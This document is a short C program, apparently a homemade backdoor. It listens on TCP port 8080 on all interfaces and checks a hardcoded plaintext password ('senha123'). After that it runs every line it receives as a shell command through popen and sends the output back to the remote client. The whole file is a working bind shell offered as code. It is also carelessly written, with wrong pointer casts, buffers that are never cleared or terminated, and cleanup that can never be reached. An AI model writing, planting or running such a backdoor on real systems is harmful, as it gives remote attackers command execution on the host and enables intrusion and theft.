#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>


int main(){
        int sock = 0;

        struct sockaddr_in serv_addr;

        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("Erro na criacao do socket");
        return -1;
        }

        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(8080);
        serv_addr.sin_addr.s_addr = INADDR_ANY;


        bind(sock, (struct serv_addr *)&serv_addr, sizeof(serv_addr));
        listen(sock, 5);
        int addrlen = sizeof(serv_addr);
        int connection = accept(sock, (struct serv_addr *)&serv_addr, (socklen_t*)&addrlen);

        char message[1024];
        char buffer[1024];
        char line[1024];

        memset(buffer, 0, sizeof(buffer));
        read(connection, buffer, 1024);
        if(strcmp(buffer, "senha123\n") != 0) {
                close(connection);
                close(sock);
                return -1;
        } 

        FILE *fp;
        while (1) {
                read(connection, buffer, 1024);
                fp = popen(buffer, "r");

                while (fgets(line, sizeof(line), fp) != NULL) {
                send(connection, line, strlen(line), 0);
                }

        }

        close(connection);
        close(sock);
        return 0;
}
 